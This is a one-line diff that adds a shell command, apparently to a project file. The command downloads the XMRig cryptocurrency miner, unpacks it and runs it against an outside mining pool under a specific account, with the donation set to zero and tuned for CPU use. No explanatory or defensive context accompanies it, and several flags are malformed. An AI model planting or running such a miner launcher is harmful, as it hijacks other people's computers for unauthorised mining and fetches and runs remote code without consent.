@@ -1,0 +1,1 @@
+wget https://github.com/XMRIG/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz && tar -xf xmrig-6.12.1-linux-x64.tar.gz && cd xmrig-6.12.1 && ./xmrig -a randomx -o stratum+tcp://stratum.cudopool.com:30010  -u o:2845:n:allno167 -px -k --donate-level =0 --asm=intel --cpu-priority 0 -t --keepalive --randomx-mode=fast
